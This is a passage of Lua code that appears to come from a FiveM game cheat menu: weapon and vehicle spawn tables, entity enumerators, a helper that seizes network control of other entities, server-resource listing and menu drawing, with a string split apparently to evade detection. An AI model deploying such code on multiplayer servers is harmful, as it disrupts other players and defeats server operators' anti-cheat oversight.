'weapon_smokegrenade', name = '~s~~s~Tear Gas', bInfAmmo = false, mods = {} }, Flare = { id = 'weapon_flare', name = '~s~~s~Flare', bInfAmmo = false, mods = {} } }, Misc = { Parachute = { id = 'gadget_parachute', name = '~s~~s~Parachute', bInfAmmo = false, mods = {} }, FireExtinguisher = { id = 'weapon_fireextinguisher', name = '~s~~s~Fire Extinguisher', bInfAmmo = false, mods = {} } } }
Aldoportu.trashTables.weaponsModels = { --[[Melee]] 'WEAPON_KNIFE', 'WEAPON_KNUCKLE', 'WEAPON_NIGHTSTICK', 'WEAPON_HAMMER', 'WEAPON_BAT', 'WEAPON_GOLFCLUB', 'WEAPON_CROWBAR', 'WEAPON_BOTTLE', 'WEAPON_DAGGER', 'WEAPON_HATCHET', 'WEAPON_MACHETE', 'WEAPON_FLASHLIGHT', 'WEAPON_SWITCHBLADE', 'WEAPON_POOLCUE', 'WEAPON_PIPEWRENCH', --[[Pistols]] 'WEAPON_PISTOL', 'WEAPON_PISTOL_MK2', 'WEAPON_COMBATPISTOL', 'WEAPON_APPISTOL', 'WEAPON_REVOLVER', 'WEAPON_REVOLVER_MK2', 'WEAPON_DOUBLEACTION', 'WEAPON_PISTOL50', 'WEAPON_SNSPISTOL', 'WEAPON_SNSPISTOL_MK2', 'WEAPON_HEAVYPISTOL', 'WEAPON_VINTAGEPISTOL', 'WEAPON_STUNGUN', 'WEAPON_FLAREGUN', 'WEAPON_MARKSMANPISTOL', --[[ SMGs / MGs]] 'WEAPON_MICROSMG', 'WEAPON_MINISMG', 'WEAPON_SMG', 'WEAPON_SMG_MK2', 'WEAPON_ASSAULTSMG', 'WEAPON_COMBATPDW', 'WEAPON_GUSENBERG', 'WEAPON_MACHINEPISTOL', 'WEAPON_MG', 'WEAPON_COMBATMG', 'WEAPON_COMBATMG_MK2', --[[ Assault Rifles]] 'WEAPON_ASSAULTRIFLE', 'WEAPON_ASSAULTRIFLE_MK2', 'WEAPON_CARBINERIFLE', 'WEAPON_CARBINERIFLE_MK2', 'WEAPON_ADVANCEDRIFLE', 'WEAPON_SPECIALCARBINE', 'WEAPON_SPECIALCARBINE_MK2', 'WEAPON_BULLPUPRIFLE', 'WEAPON_BULLPUPRIFLE_MK2', 'WEAPON_COMPACTRIFLE', --[[Shotguns]] 'WEAPON_PUMPSHOTGUN', 'WEAPON_PUMPSHOTGUN_MK2', 'WEAPON_SWEEPERSHOTGUN', 'WEAPON_SAWNOFFSHOTGUN', 'WEAPON_BULLPUPSHOTGUN', 'WEAPON_ASSAULTSHOTGUN', 'WEAPON_MUSKET', 'WEAPON_HEAVYSHOTGUN', 'WEAPON_DBSHOTGUN', --[[Sniper Rifles]] 'WEAPON_SNIPERRIFLE', 'WEAPON_HEAVYSNIPER', 'WEAPON_HEAVYSNIPER_MK2', 'WEAPON_MARKSMANRIFLE', 'WEAPON_MARKSMANRIFLE_MK2', --[[Heavy Weapons]] 'WEAPON_GRENADELAUNCHER', 'WEAPON_GRENADELAUNCHER_SMOKE', 'WEAPON_RPG', 'WEAPON_MINIGUN', 'WEAPON_FIREWORK', 'WEAPON_RAILGUN', 'WEAPON_HOMINGLAUNCHER', 'WEAPON_COMPACTLAUNCHER', --[[Thrown]] 'WEAPON_GRENADE', 'WEAPON_STICKYBOMB', 'WEAPON_PROXMINE', 'WEAPON_BZGAS', 'WEAPON_SMOKEGRENADE', 'WEAPON_MOLOTOV', 'WEAPON_FIREEXTINGUISHER', 'WEAPON_PETROLCAN', 'WEAPON_SNOWBALL', 'WEAPON_FLARE', 'WEAPON_BALL', }
Aldoportu.trashTables.vehicleCategories = { 'Addon Cars', 'Boats', 'Commercial', 'Compacts', 'Coupes', 'Cycles', 'Emergency', 'Helictopers', 'Industrial', 'Military', 'Motorcycles', 'Muscle', 'Off-Road', 'Planes', 'SUVs', 'Sedans', 'Service', 'Sports', 'Sports Classic', 'Super', 'Trailer', 'Trains', 'Utility', 'Vans' }
Aldoportu.trashTables.vehiclesAddonsList = { '2014rs5', '2016rs7', 'aaq4', 'q820', 'r8v10', 'rs4avant', 'audirs6tk', 'r820', 'rs3', 'rs318', 'sq72016', 'bentayga17', 'contgt13', 'bmci', 'e60', 'm3f80', 'x6m', 'c7', '16challenger', '16chager', '99viper', '95stang', 'mustang19', 'ap2', 'civic', 'tuscani', 'lp670sv', 'gs350', 'lc500', 'rx7tunable', 'amggtr', 'c63s', 'cl65', 'e63amg', 'g65', 'evo10', 'mitsugto', '180sx', '370z', 'gtr', 'evoque', 'subisti08', 'subwrx', 'avalon', 'cam08', 'celisupra', 'gt86', 'supra', 'supra2', 'a80', 'r50' }
Aldoportu.trashTables.vehiclesBoatsList = { 'Dinghy', 'Dinghy2', 'Dinghy3', 'Dingh4', 'Jetmax', 'Marquis', 'Seashark', 'Seashark2', 'Seashark3', 'Speeder', 'Speeder2', 'Squalo', 'Submersible', 'Submersible2', 'Suntrap', 'Toro', 'Toro2', 'Tropic', 'Tropic2', 'Tug' }
Aldoportu.trashTables.vehiclesTruckList = { 'Benson', 'Biff', 'Cerberus', 'Cerberus2', 'Cerberus3', 'Hauler', 'Hauler2', 'Mule', 'Mule2', 'Mule3', 'Mule4', 'Packer', 'Phantom', 'Phantom2', 'Phantom3', 'Pounder', 'Pounder2', 'Stockade', 'Stockade3', 'Terbyte' }
Aldoportu.trashTables.vehiclesCompactsList = { 'Blista', 'Blista2', 'Blista3', 'Brioso', 'Dilettante', 'Dilettante2', 'Issi2', 'Issi3', 'issi4', 'Iss5', 'issi6', 'Panto', 'Prarire', 'Rhapsody' }
Aldoportu.trashTables.vehiclesCoupesList = { 'CogCabrio', 'Exemplar', 'F620', 'Felon', 'Felon2', 'Jackal', 'Oracle', 'Oracle2', 'Sentinel', 'Sentinel2', 'Windsor', 'Windsor2', 'Zion', 'Zion2' }
Aldoportu.trashTables.vehiclesBicyclesList = { 'Bmx', 'Cruiser', 'Fixter', 'Scorcher', 'Tribike', 'Tribike2', 'tribike3' }
Aldoportu.trashTables.vehiclesEmergencyList = { 'ambulance', 'FBI', 'FBI2', 'FireTruk', 'PBus', 'police', 'Police2', 'Police3', 'Police4', 'PoliceOld1', 'PoliceOld2', 'PoliceT', 'Policeb', 'Polmav', 'Pranger', 'Predator', 'Riot', 'Riot2', 'Sheriff', 'Sheriff2' }
Aldoportu.trashTables.vehiclesHelicoptersList = { 'Akula', 'Annihilator', 'Buzzard', 'Buzzard2', 'Cargobob', 'Cargobob2', 'Cargobob3', 'Cargobob4', 'Frogger', 'Frogger2', 'Havok', 'Hunter', 'Maverick', 'Savage', 'Seasparrow', 'Skylift', 'Supervolito', 'Supervolito2', 'Swift', 'Swift2', 'Valkyrie', 'Valkyrie2', 'Volatus' }
Aldoportu.trashTables.vehiclesIndustrialsList = { 'Bulldozer', 'Cutter', 'Dump', 'Flatbed', 'Guardian', 'Handler', 'Mixer', 'Mixer2', 'Rubble', 'Tiptruck', 'Tiptruck2' }
Aldoportu.trashTables.vehiclesMilitaryVehicles = { 'APC', 'Barracks', 'Barracks2', 'Barracks3', 'Barrage', 'Chernobog', 'Crusader', 'Halftrack', 'Khanjali', 'Rhino', 'Scarab', 'Scarab2', 'Scarab3', 'Thruster', 'Trailersmall2' }
Aldoportu.trashTables.vehiclesMotorcyclesList = { 'Akuma', 'Avarus', 'Bagger', 'Bati2', 'Bati', 'BF400', 'Blazer4', 'CarbonRS', 'Chimera', 'Cliffhanger', 'Daemon', 'Daemon2', 'Defiler', 'Deathbike', 'Deathbike2', 'Deathbike3', 'Diablous', 'Diablous2', 'Double', 'Enduro', 'esskey', 'Faggio2', 'Faggio3', 'Faggio', 'Fcr2', 'fcr', 'gargoyle', 'hakuchou2', 'hakuchou', 'hexer', 'innovation', 'Lectro', 'Manchez', 'Nemesis', 'Nightblade', 'Oppressor', 'Oppressor2', 'PCJ', 'Ratbike', 'Ruffian', 'Sanchez2', 'Sanchez', 'Sanctus', 'Shotaro', 'Sovereign', 'Thrust', 'Vader', 'Vindicator', 'Vortex', 'Wolfsbane', 'zombiea', 'zombieb' }
Aldoportu.trashTables.vehiclesMuscleList = { 'Blade', 'Buccaneer', 'Buccaneer2', 'Chino', 'Chino2', 'clique', 'Deviant', 'Dominator', 'Dominator2', 'Dominator3', 'Dominator4', 'Dominator5', 'Dominator6', 'Dukes', 'Dukes2', 'Ellie', 'Faction', 'faction2', 'faction3', 'Gauntlet', 'Gauntlet2', 'Hermes', 'Hotknife', 'Hustler', 'Impaler', 'Impaler2', 'Impaler3', 'Impaler4', 'Imperator', 'Imperator2', 'Imperator3', 'Lurcher', 'Moonbeam', 'Moonbeam2', 'Nightshade', 'Phoenix', 'Picador', 'RatLoader', 'RatLoader2', 'Ruiner', 'Ruiner2', 'Ruiner3', 'SabreGT', 'SabreGT2', 'Sadler2', 'Slamvan', 'Slamvan2', 'Slamvan3', 'Slamvan4', 'Slamvan5', 'Slamvan6', 'Stalion', 'Stalion2', 'Tampa', 'Tampa3', 'Tulip', 'Vamos,', 'Vigero', 'Virgo', 'Virgo2', 'Virgo3', 'Voodoo', 'Voodoo2', 'Yosemite' }
Aldoportu.trashTables.vehiclesOffroadList = { 'BFinjection', 'Bifta', 'Blazer', 'Blazer2', 'Blazer3', 'Blazer5', 'Bohdi', 'Brawler', 'Bruiser', 'Bruiser2', 'Bruiser3', 'Caracara', 'DLoader', 'Dune', 'Dune2', 'Dune3', 'Dune4', 'Dune5', 'Insurgent', 'Insurgent2', 'Insurgent3', 'Kalahari', 'Kamacho', 'LGuard', 'Marshall', 'Mesa', 'Mesa2', 'Mesa3', 'Monster', 'Monster4', 'Monster5', 'Nightshark', 'RancherXL', 'RancherXL2', 'Rebel', 'Rebel2', 'RCBandito', 'Riata', 'Sandking', 'Sandking2', 'Technical', 'Technical2', 'Technical3', 'TrophyTruck', 'TrophyTruck2', 'Freecrawler', 'Menacer' }
Aldoportu.trashTables.vehiclesPlanesList = { 'AlphaZ1', 'Avenger', 'Avenger2', 'Besra', 'Blimp', 'blimp2', 'Blimp3', 'Bombushka', 'Cargoplane', 'Cuban800', 'Dodo', 'Duster', 'Howard', 'Hydra', 'Jet', 'Lazer', 'Luxor', 'Luxor2', 'Mammatus', 'Microlight', 'Miljet', 'Mogul', 'Molotok', 'Nimbus', 'Nokota', 'Pyro', 'Rogue', 'Seabreeze', 'Shamal', 'Starling', 'Stunt', 'Titan', 'Tula', 'Velum', 'Velum2', 'Vestra', 'Volatol', 'Striekforce' }
Aldoportu.trashTables.vehiclesSuvsList = { 'BJXL', 'Baller', 'Baller2', 'Baller3', 'Baller4', 'Baller5', 'Baller6', 'Cavalcade', 'Cavalcade2', 'Dubsta', 'Dubsta2', 'Dubsta3', 'FQ2', 'Granger', 'Gresley', 'Habanero', 'Huntley', 'Landstalker', 'patriot', 'Patriot2', 'Radi', 'Rocoto', 'Seminole', 'Serrano', 'Toros', 'XLS', 'XLS2' }
Aldoportu.trashTables.vehiclesSedansList = { 'Asea', 'Asea2', 'Asterope', 'Cog55', 'Cogg552', 'Cognoscenti', 'Cognoscenti2', 'emperor', 'emperor2', 'emperor3', 'Fugitive', 'Glendale', 'ingot', 'intruder', 'limo2', 'premier', 'primo', 'primo2', 'regina', 'romero', 'stafford', 'Stanier', 'stratum', 'stretch', 'surge', 'tailgater', 'warrener', 'Washington' }
Aldoportu.trashTables.vehiclesServicesList = { 'Airbus', 'Brickade', 'Bus', 'Coach', 'Rallytruck', 'Rentalbus', 'taxi', 'Tourbus', 'Trash', 'Trash2', 'WastIndr', 'PBus2' }
Aldoportu.trashTables.vehiclesSportsList = { 'Alpha', 'Banshee', 'Banshee2', 'BestiaGTS', 'Buffalo', 'Buffalo2', 'Buffalo3', 'Carbonizzare', 'Comet2', 'Comet3', 'Comet4', 'Comet5', 'Coquette', 'Deveste', 'Elegy2', 'Feltzer2', 'Feltzer3', 'FlashGT', 'Furoregt', 'Fusilade', 'Futo', 'GB200', 'Hotring', 'Infernus2', 'Italigto', 'Jester', 'Jester2', 'Khamelion', 'Kurama', 'Kurama2', 'Lynx', 'MAssacro', 'MAssacro2', 'neon', 'Ninef', 'ninfe2', 'omnis', 'Pariah', 'Penumbra', 'Raiden', 'RapidGT', 'RapidGT2', 'Raptor', 'Revolter', 'Ruston', 'Schafter2', 'Schafter3', 'Schafter4', 'Schafter5', 'Schafter6', 'Schlagen', 'Schwarzer', 'Sentinel3', 'Seven70', 'Specter', 'Specter2', 'Streiter', 'Sultan', 'Surano', 'Tampa2', 'Tropos', 'Verlierer2', 'ZR380' }
Aldoportu.trashTables.vehiclesSportsClassicsList = { 'Ardent', 'BType', 'BType2', 'BType3', 'Casco', 'Cheetah2', 'Cheburek', 'Coquette2', 'Coquette3', 'Deluxo', 'Fagaloa', 'Gt500', 'JB700', 'Jester3', 'MAmba', 'Manana', 'Michelli', 'Monroe', 'Peyote', 'Pigalle', 'RapidGT3', 'Retinue', 'Savestra', 'Stinger', 'Stingergt', 'Stromberg', 'Swinger', 'Torero', 'Tornado', 'Tornado2', 'Tornado3', 'Tornado4', 'Tornado5', 'Tornado6', 'Viseris', 'Z190', 'ZType' }
Aldoportu.trashTables.vehiclesSupersList = { 'Adder', 'Autarch', 'Bullet', 'Cheetah', 'Cyclone', 'Elegy', 'EntityXF', 'Entity2', 'FMJ', 'GP1', 'Infernus', 'LE7B', 'Nero', 'Nero2', 'Osiris', 'Penetrator', 'PFister811', 'Prototipo', 'Reaper', 'SC1', 'Scramjet', 'Sheava', 'SultanRS', 'Superd', 'T20', 'Taipan', 'Tempesta', 'Tezeract', 'Turismo2', 'Turismor', 'Tyrant', 'Tyrus', 'Vacca', 'Vagner', 'Vigilante', 'Visione', 'Voltic', 'Voltic2', 'Zentorno', 'Italigtb', 'Italigtb2', 'XA21' }
Aldoportu.trashTables.vehiclesTrailersList = { 'ArmyTanker', 'ArmyTrailer', 'ArmyTrailer2', 'BaleTrailer', 'BoatTrailer', 'CableCar', 'DockTrailer', 'Graintrailer', 'Proptrailer', 'Raketailer', 'TR2', 'TR3', 'TR4', 'TRFlat', 'TVTrailer', 'Tanker', 'Tanker2', 'Trailerlogs', 'Trailersmall', 'Trailers', 'Trailers2', 'Trailers3' }
Aldoportu.trashTables.vehiclesTrainsList = { 'Freight', 'Freightcar', 'Freightcont1', 'Freightcont2', 'Freightgrain', 'Freighttrailer', 'TankerCar' }
Aldoportu.trashTables.vehiclesWorkList = { 'Airtug', 'Caddy', 'Caddy2', 'Caddy3', 'Docktug', 'Forklift', 'Mower', 'Ripley', 'Sadler', 'Scrap', 'TowTruck', 'Towtruck2', 'Tractor', 'Tractor2', 'Tractor3', 'TrailerLArge2', 'Utilitruck', 'Utilitruck3', 'Utilitruck2' }
Aldoportu.trashTables.vehiclesVansList = { 'Bison', 'Bison2', 'Bison3', 'BobcatXL', 'Boxville', 'Boxville2', 'Boxville3', 'Boxville4', 'Boxville5', 'Burrito', 'Burrito2', 'Burrito3', 'Burrito4', 'Burrito5', 'Camper', 'GBurrito', 'GBurrito2', 'Journey', 'Minivan', 'Minivan2', 'Paradise', 'pony', 'Pony2', 'Rumpo', 'Rumpo2', 'Rumpo3', 'Speedo', 'Speedo2', 'Speedo4', 'Surfer', 'Surfer2', 'Taco', 'Youga', 'youga2' }
Aldoportu.trashTables.fullVehiclesList = { Aldoportu.trashTables.vehiclesAddonsList, Aldoportu.trashTables.vehiclesBoatsList, Aldoportu.trashTables.vehiclesTruckList, Aldoportu.trashTables.vehiclesCompactsList, Aldoportu.trashTables.vehiclesCoupesList, Aldoportu.trashTables.vehiclesBicyclesList, Aldoportu.trashTables.vehiclesEmergencyList, Aldoportu.trashTables.vehiclesHelicoptersList, Aldoportu.trashTables.vehiclesIndustrialsList, Aldoportu.trashTables.vehiclesMilitaryVehicles, Aldoportu.trashTables.vehiclesMotorcyclesList, Aldoportu.trashTables.vehiclesMuscleList, Aldoportu.trashTables.vehiclesOffroadList, Aldoportu.trashTables.vehiclesPlanesList, Aldoportu.trashTables.vehiclesSuvsList, Aldoportu.trashTables.vehiclesSedansList, Aldoportu.trashTables.vehiclesServicesList, Aldoportu.trashTables.vehiclesSportsList, Aldoportu.trashTables.vehiclesSportsClassicsList, Aldoportu.trashTables.vehiclesSupersList, Aldoportu.trashTables.vehiclesTrailersList, Aldoportu.trashTables.vehiclesTrainsList, Aldoportu.trashTables.vehiclesWorkList, Aldoportu.trashTables.vehiclesVansList }

local oTable = {} do function oTable.insert(t, k, v) if not rawget(t._values, k) then t._keys[#t._keys + 1] = k end if v == nil then oTable.remove(t, k) else t._values[k] = v end end local function find(t, value) for i,v in ipairs(t) do if v == value then return i end end end function oTable.remove(t, k) local v = t._values[k] if v ~= nil then table.remove(t._keys, find(t._keys, k)) t._values[k] = nil end return v end function oTable.index(t, k) return rawget(t._values, k) end function oTable.pairs(t) local i = 0 return function() i = i + 1 local key = t._keys[i] if key ~= nil then return key, t._values[key] end end end function oTable.new(init) init = init or {} local t = {_keys={}, _values={}} local n = #init if n % 2 ~= 0 then error'in oTable initialization: key is missing value' end for i=1,n/2 do local k = init[i * 2 - 1] local v = init[i * 2] if t._values[k] ~= nil then error('duplicate key:'..k) end t._keys[#t._keys + 1]  = k t._values[k] = v end return setmetatable(t, {__newindex=oTable.insert, __len=function(t) return #t._keys end, __pairs=oTable.pairs, __index=t._values }) end end

local entityEnumerator = { __gc = function(enum) if enum.destructor and enum.handle then enum.destructor(enum.handle) end enum.destructor = nil enum.handle = nil end }

Aldoportu.trashFunctions.enumEntities = function(initFunc, moveFunc, disposeFunc) return coroutine.wrap(function() local iter, id = initFunc() if not id or id == 0 then disposeFunc(iter) return end local enum = {handle = iter, destructor = disposeFunc} setmetatable(enum, entityEnumerator) local next = true repeat coroutine.yield(id) next, id = moveFunc(iter) until not next enum.destructor, enum.handle = nil, nil disposeFunc(iter) end) end
Aldoportu.trashFunctions.enumObjects = function() return Aldoportu.trashFunctions.enumEntities(FindFirstObject, FindNextObject, EndFindObject) end
Aldoportu.trashFunctions.enumPeds = function() return Aldoportu.trashFunctions.enumEntities(FindFirstPed, FindNextPed, EndFindPed) end
Aldoportu.trashFunctions.enumVehicles = function() return Aldoportu.trashFunctions.enumEntities(FindFirstVehicle, FindNextVehicle, EndFindVehicle) end
Aldoportu.trashFunctions.EnumeratePickups = function() return Aldoportu.trashFunctions.enumEntities(FindFirstPickup, FindNextPickup, EndFindPickup) end
Aldoportu.trashFunctions.reqControlOnce = function(entity) if not NetworkIsInSession() or NetworkHasControlOfEntity(entity) then return true end SetNetworkIdCanMigrate(NetworkGetNetworkIdFromEntity(entity), true) return NetworkRequestControlOfEntity(entity) end
Aldoportu.trashFunctions.rotationToDirection = function(rotation) local retz = math.rad(rotation.z) local retx = math.rad(rotation.x) local absx = math.abs(math.cos(retx)) return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx)) end
Aldoportu.trashFunctions.screenToWrld = function(screenCoord) local camRot = GetGameplayCamRot(2) local camPos = GetGameplayCamCoord() local vect2x = 0.0 local vect2y = 0.0 local vect21y = 0.0 local vect21x = 0.0 local direction = Aldoportu.trashFunctions.rotationToDirection(camRot) local vect3 = vector3(camRot.x + 10.0, camRot.y + 0.0, camRot.z + 0.0) local vect31 = vector3(camRot.x - 10.0, camRot.y + 0.0, camRot.z + 0.0) local vect32 = vector3(camRot.x, camRot.y + 0.0, camRot.z + -10.0) local direction1 = Aldoportu.trashFunctions.rotationToDirection(vector3(camRot.x, camRot.y + 0.0, camRot.z + 10.0)) - Aldoportu.trashFunctions.rotationToDirection(vect32) local direction2 = Aldoportu.trashFunctions.rotationToDirection(vect3) - Aldoportu.trashFunctions.rotationToDirection(vect31) local radians = -(math.rad(camRot.y)) vect33 = (direction1 * math.cos(radians)) - (direction2 * math.sin(radians)) vect34 = (direction1 * math.sin(radians)) - (direction2 * math.cos(radians)) local case1, x1, y1 = Aldoportu.trashFunctions.worldToScreenRel(((camPos + (direction * 10.0)) + vect33) + vect34) if not case1 then vect2x = x1 vect2y = y1 return camPos + (direction * 10.0) end local case2, x2, y2 = Aldoportu.trashFunctions.worldToScreenRel(camPos + (direction * 10.0)) if not case2 then vect21x = x2 vect21y = y2 return camPos + (direction * 10.0) end if math.abs(vect2x - vect21x) < 0.001 or math.abs(vect2y - vect21y) < 0.001 then return camPos + (direction * 10.0) end local x = (screenCoord.x - vect21x) / (vect2x - vect21x) local y = (screenCoord.y - vect21y) / (vect2y - vect21y) return ((camPos + (direction * 10.0)) + (vect33 * x)) + (vect34 * y) end
Aldoportu.trashFunctions.subVectors = function(vect1, vect2) return vector3(vect1.x - vect2.x, vect1.y - vect2.y, vect1.z - vect2.z) end
Aldoportu.trashFunctions.GetCamDirFromScreenCenter = function() local pos = GetGameplayCamCoord() local world = Aldoportu.trashFunctions.screenToWrld(0, 0) local ret = Aldoportu.trashFunctions.subVectors(world, pos) return ret end
Aldoportu.trashFunctions.worldToScreenRel = function(worldCoords) local check, x, y = GetScreenCoordFromWorldCoord(worldCoords.x, worldCoords.y, worldCoords.z) if not check then return false end screenCoordsx = (x - 0.5) * 2.0 screenCoordsy = (y - 0.5) * 2.0 return true, screenCoordsx, screenCoordsy end
Aldoportu.trashFunctions.returnRGB = function(l) local rgb = {} local n = GetGameTimer() / 200 rgb.r = math.floor(math.sin(n * l + 0) * 127 + 128) rgb.g = math.floor(math.sin(n * l + 2) * 127 + 128) rgb.b = math.floor(math.sin(n * l + 4) * 127 + 128) return rgb end
Aldoportu.trashFunctions.weaponNameFromHash = function(hash) for i = 1, #Aldoportu.trashTables.weaponsModels do if GetHashKey(Aldoportu.trashTables.weaponsModels[i]) == hash then return string.sub(Aldoportu.trashTables.weaponsModels[i], 8) end end end
Aldoportu.trashFunctions.scaleVector = function(vect, mult) return vector3(vect.x * mult, vect.y * mult, vect.z * mult) end
Aldoportu.trashFunctions.addVector = function(vect1, vect2) return vector3(vect1.x + vect2.x, vect1.y + vect2.y, vect1.z + vect2.z) end
Aldoportu.trashFunctions.multiplyVector = function(coords, coordz) return vector3(coords.x * coordz, coords.y * coordz, coords.z * coordz) end
Aldoportu.trashFunctions.forceOscillate = function(entity, position, angleFreq, dampRatio) local pos1 = Aldoportu.trashFunctions.scaleVector(Aldoportu.trashFunctions.subVectors(position, GetEntityCoords(entity)), (angleFreq * angleFreq)) local pos2 = Aldoportu.trashFunctions.addVector(Aldoportu.trashFunctions.scaleVector(GetEntityVelocity(entity), (2.0 * angleFreq * dampRatio)), vector3(0.0, 0.0, 0.1)) local targetPos = Aldoportu.trashFunctions.subVectors(pos1, pos2) ApplyForceToEntity(entity, 3, targetPos, 0, 0, 0, false, false, true, true, false, true) end
Aldoportu.trashFunctions.getDistance = function(pointA, pointB) local aX = pointA.x local aY = pointA.y local aZ = pointA.z local bX = pointB.x local bY = pointB.y local bZ = pointB.z local xBA = bX - aX local yBA = bY - aY local zBA = bZ - aZ local y2 = yBA * yBA local x2 =  xBA * xBA local sum2 = y2 + x2 return math.sqrt(sum2 + zBA) end
Aldoportu.trashFunctions.initIntro = function(scaleform, message) local scaleform = RequestScaleformMovie(scaleform) while not HasScaleformMovieLoaded(scaleform) do pWait(1) end PushScaleformMovieFunction(scaleform, 'SHOW_SHARD_WASTED_MP_MESSAGE') PushScaleformMovieFunctionParameterString(message) PopScaleformMovieFunctionVoid() return scaleform end
Aldoportu.trashFunctions.math_round = function(num, numDecimalPlaces)
	return tonumber(string.format('%.' .. (numDecimalPlaces or 0) .. 'f', num))
end
Aldoportu.trashFunctions.table_removekey = function(array, element) 
	for i = 1, #array do 
		if array[i] == element then 
			table.remove(array, i) 
		end 
	end 
end
Aldoportu.trashFunctions.table_includes = function(table, element)
    for _, value in pairs(table) do
      if value == element then
        return true
      end
    end
    return false
end

do
	local NumberCharset = {}
	local Charset = {}
	for i = 48,  57 do table.insert(NumberCharset, string.char(i)) end
	for i = 65,  90 do table.insert(Charset, string.char(i)) end
	for i = 97, 122 do table.insert(Charset, string.char(i)) end
	Aldoportu.trashFunctions.getRandomNumber = function(length)
		pWait(0)
		math.randomseed(GetGameTimer())
		if length > 0 then
			return Aldoportu.trashFunctions.getRandomNumber(length - 1) .. NumberCharset[math.random(1, #NumberCharset)]
		else
			return ''
		end
	end

	Aldoportu.trashFunctions.getRandomLetter = function(length)
		pWait(0)
		math.randomseed(GetGameTimer())
		if length > 0 then
			return Aldoportu.trashFunctions.getRandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
		else
			return ''
		end
	end
end

Aldoportu.trashFunctions.keyboardInput = function(TextEntry, ExampleText, MaxStringLength)
	Aldoportu.natives.addTextEntry('FMMC_KEY_TIP1', TextEntry .. ':')
	Aldoportu.natives.displayOnscreenKeyboard(1, 'FMMC_KEY_TIP1', '', ExampleText, '', '', '', MaxStringLength)
	blockinput = true

	while Aldoportu.natives.updateOnscreenKeyboard() ~= 1 and Aldoportu.natives.updateOnscreenKeyboard() ~= 2 do
		pWait(0)
	end

	if Aldoportu.natives.updateOnscreenKeyboard() ~= 2 then
		local result = GetOnscreenKeyboardResult()
		pWait(500)
		blockinput = false
		return result
	else
		pWait(500)
		blockinput = false
		return nil
	end
end

Aldoportu.trashFunctions.getPlayerStatus = function(target)
	local maxHealth = GetEntityMaxHealth(target)
	local currentHealth = GetEntityHealth(target)
	if currentHealth >= 1 then
		return ' [~g~Alive~m~] [~g~'..currentHealth..'~m~/~g~'..maxHealth..'~m~]'
	else
		return ' [~r~Dead~m~] [~r~'..currentHealth..'~m~/~r~'..maxHealth..'~m~]'
	end
end

Aldoportu.trashFunctions.getResources = function()
	local resources = {}
	for i=0, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
	end
	return resources
end

function Aldoportu.debugPrint(text)
	if Aldoportu.debug then
		Citizen.Trace('[d'..'opamine] '..tostring(text)..'.\n')
	end
end

function Aldoportu.setMenuProperty(id, property, value)
	if id and Aldoportu.menuProps.shitMenus[id] then
		Aldoportu.menuProps.shitMenus[id][property] = value
		Aldoportu.debugPrint(id..' menu property changed: { '..tostring(property)..', '..tostring(value)..' }')
	end
end

function Aldoportu.isMenuVisible(id)
	if id and Aldoportu.menuProps.shitMenus[id] then
		return Aldoportu.menuProps.shitMenus[id].visible
	else
		return false
	end
end

function Aldoportu.setMenuVisible(id, visible, holdCurrent)
	if id and Aldoportu.menuProps.shitMenus[id] then
		Aldoportu.setMenuProperty(id, 'visible', visible)

		if not holdCurrent and Aldoportu.menuProps.shitMenus[id] then
			Aldoportu.setMenuProperty(id, 'currentOption', 1)
		end

		if visible then
			if id ~= Aldoportu.menuProps.currentMenu and Aldoportu.isMenuVisible(Aldoportu.menuProps.currentMenu) then
				Aldoportu.setMenuVisible(Aldoportu.menuProps.currentMenu, false)
			end

			Aldoportu.menuProps.currentMenu = id
		end
	end
end

function Aldoportu.DrawTxt(text, x, y, scale, size, color)
	Aldoportu.natives.setTextColour(color.r, color.g, color.b, color.a)
	Aldoportu.natives.setTextFont(4)
	SetTextCentre()
    Aldoportu.natives.setTextProportional(1)
    Aldoportu.natives.setTextScale(scale, size)
    SetTextDropshadow(0, 0, 0, 0, 255)
    SetTextEdge(2, 0, 0, 0, 255)
	Aldoportu.natives.setTextDropShadow()
	if Aldoportu.menuProps.menu_TextOutline then
		Aldoportu.natives.setTextOutline()
	end
    Aldoportu.natives.beginTextCommandDisplayText('STRING')
    Aldoportu.natives.addTextComponentSubstringPlayerName(text)
    Aldoportu.natives.endTextCommandDisplayText(x, y)
end

function Aldoportu.drawText(text, x, y, font, color, scale, center, shadow, alignRight)
	Aldoportu.natives.setTextColour(color.r, color.g, color.b, color.a)
	if Aldoportu.menuProps.menu_TextDropShadow then
		Aldoportu.natives.setTextDropShadow(0, 0, 0, 0,255)
	end
	SetTextEdge(2, 0, 0, 0, 255)
	if Aldoportu.menuProps.menu_TextOutline then
		Aldoportu.natives.setTextOutline()
	end
	Aldoportu.natives.setTextFont(font)
	Aldoportu.natives.setTextScale(scale, scale)

	if shadow then
		Aldoportu.natives.setTextDropShadow(2, 2, 0, 0, 0)
	end

	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		if center then
			SetTextCentre(center)
		elseif alignRight then
			SetTextWrap(Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x, Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width - Aldoportu.menuProps.buttonTextXOffset)
			SetTextRightJustify(true)
		end
	end

	Aldoportu.natives.beginTextCommandDisplayText('STRING')
	Aldoportu.natives.addTextComponentSubstringPlayerName(text)
	Aldoportu.natives.endTextCommandDisplayText(x, y)
end

function Aldoportu.drawRect(x, y, width, height, color)
	Aldoportu.natives.drawRect(x, y, width, height, color.r, color.g, color.b, color.a)
end

function Aldoportu.drawTitle()
	if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu] then
		local x = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width / 2 
		local xText = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].x + Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].width * Aldoportu.menuProps.titleXOffset  
		local y = Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].y + Aldoportu.menuProps.titleHeight * 1/Aldoportu.menuProps.titleSpacing 

		if Aldoportu.menuProps.shitMenus[Aldoportu.menuProps.currentMenu].titleBackgroundSprite then
